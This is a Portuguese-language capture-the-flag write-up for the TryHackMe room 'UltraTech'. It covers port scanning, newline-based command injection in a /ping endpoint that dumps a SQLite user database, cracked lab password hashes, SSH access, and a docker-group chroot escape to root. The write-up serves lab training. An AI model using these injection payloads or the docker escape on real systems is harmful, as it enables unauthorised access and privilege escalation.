---
title: Writeup @ UltraTech
published: 2026-02-02
description: 'Solving CTF "UltraTech".'
image: ''
tags: [Hacking, Writeup]
category: Hacking
draft: false
lang: 'pt-br'
---

# Room Information

> The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing.

- TryHackMe - UltraTech;
- https://tryhackme.com/room/ultratech1.

# Information Gathering

## Port Scanning

```
# Nmap 7.98 scan initiated Fri Jan  9 12:57:46 2026 as: /usr/lib/nmap/nmap --privileged -sS -p- -oN nmap-out.txt 10.66.143.233
Nmap scan report for 10.66.143.233
Host is up (0.43s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
```

- Conseguimos algumas portas e servicos interessantes, sao eles:
	- Porta `21` rodando FTP;
	- Porta `22` rodando SSH;
	- Porta `8081` rodando esse servico "Blackice-Icecap", essa porta normalmente esta associada a servicoes WEB;
	- Porta `31331` com servico desconhecido, tambem eh uma porta alta, nao tendo nenhum servico associado por padrao.
- Vamos enumerar!

# Enumeration

## FTP Enumeration

- Ao ver um servico FTP, a primeira coisa que pensei foi: "Sera que posso ter acesso Anonymous?";

```
$ nc 10.66.150.186 21
220 (vsFTPd 3.0.5)
USER anonymous
331 Please specify the password.
PASS anonymous
530 Login incorrect
```

- Sem sucesso.

## Web Enumeration

- Ao acessar o IP que recebemos na porta `8081`, descubro que esta rodando uma API REST;
- Olhando no **DevTools** procurando por algum trecho de codigo / chamada da pagina, nao encontro nada alem do path raiz (`/`);
- Mas, ao acessar a porta `31331`, encontrei outra parte do servidor, agora sendo o _front-end_;
- Dei uma vasculhada nas paginas e _hrefs_ que tinham, mas nada de interessante, ate que acessei `robots.txt` e descobri:

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

- E, indo ate o `.txt`:

```
/
/index.html
/what.html
/partners.html
```

- Achamos mais paginas, mas apenas uma me chamou a atencao de verdade, a `/partners.html`;
- Nela podemos encontrar um formulario para login, e tentando algumas **SQLi** (`' OR 1=1--`) vi que nada funcionava, entao fui ver como a chamada era feita;
- Indo ate a **DevTools** do Firefox na secao de **Debugger**, pude ver dois arquivos:
	- `api.js`;
	- `app.min.js`.
- O `app.min.js` estava obfuscado, entao nem perdi tempo, mas o `api.js` tinha coisas interessantes:

```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }

    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;

})();
```

# Exploitation

## Path "/ping"

- Observe essa chamada para `/ping?ip=`, aparentemente o _front-end_ faz uma chamada para o _back-end_, que por sua vez retorna o status da API;
- Testando por `http://10.66.150.186:8081/ping?ip=10.66.150.186` obtemos um resultado interessante:

```
PING 10.66.150.186 (10.66.150.186) 56(84) bytes of data. 64 bytes from 10.66.150.186: icmp_seq=1 ttl=64 time=0.057 ms --- 10.66.150.186 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.057/0.057/0.057/0.000 ms
```

- Isso parece muito com o comando `ping -n1 [IP]` de sistemas UNIX, vamos tentar executar outros comandos usando operadores de continuidade, como `&&` / `;` / `||` / etc;
- Admito que passei um tempo testando alguns desses comandos, mas o desenvolvedor pensou um pouco e removeu os principais que foi os que eu falei;
- Mas tinha um que ele nao tinha previsto: `%0A`, o famoso **ENTER**;
- Entao, testando `http://10.66.150.186:8081/ping?ip=10.66.150.186%0als`:

```
PING 10.66.150.186 (10.66.150.186) 56(84) bytes of data. 64 bytes from 10.66.150.186: icmp_seq=1 ttl=64 time=0.052 ms --- 10.66.150.186 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.052/0.052/0.052/0.000 ms index.js node_modules package.json package-lock.json start.sh utech.db.sqlite
```

- **BINGO**, temos uma especie de **RCE**;
- Se olhar bem, temos um banco de dados **SQLite** chamado `utech.db.sqlite`;
- Como eh um banco simples, vamos tentar extrair informacoes com `strings` em `http://10.66.150.186:8081/ping?ip=10.66.150.186%0Astrings%20utech.db.sqlite`:

```
PING 10.66.150.186 (10.66.150.186) 56(84) bytes of data. 64 bytes from 10.66.150.186: icmp_seq=1 ttl=64 time=0.051 ms --- 10.66.150.186 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms SQLite format 3 etableusersusers CREATE TABLE users ( login Varchar, password Varchar, type Int ) r00tf357a0c52799563c7c7b76c1e7543a32) admin0d0ea5111e3c1def594c1684e3b9be84
```

- Conseguimos duas hashes e dois usuarios, e descriptografando na primeira plataforma online que encontrei, temos:

```
r00t
f357a0c52799563c7c7b76c1e7543a32 == n100906

admin
0d0ea5111e3c1def594c1684e3b9be84 == mrsheafy
```

- Logando na pagina de login que tinhamos achado com as credenciais de _admin_, encontramos a mensagem:

```
# Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

_lp1_
```

- Ah, se lembram do servico SSH rodando? Vamos tentar acessar com _r00t_:

```
$ ssh r00t@10.66.150.186
r00t@ip-10-66-150-186:~$ whoami
r00t
r00t@ip-10-66-150-186:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

- Conseguimos acesso!

# Privilege Escalation

- Notou alguma coisa diferente no comando `id`? Exatamente, temos permissao ao grupo `docker`;
- Procurando no **GTFObins** por docker, encontramos o comando:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- O que ele faz eh montar o _filesystem_ raiz do host (`/`) dentro de `/mnt` e troca a raiz do processo para `/mnt` (que eh o `/` do host) e abre um **shell dentro do filesystem do host**, nao so do container;
- Vamos procurar por alguma imagem que ja exista:

```
r00t@ip-10-66-150-186:~$ docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8M
```

- Assim:

```
r00t@ip-10-66-150-186:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
#
```

- E assim finalizamos o CTF!
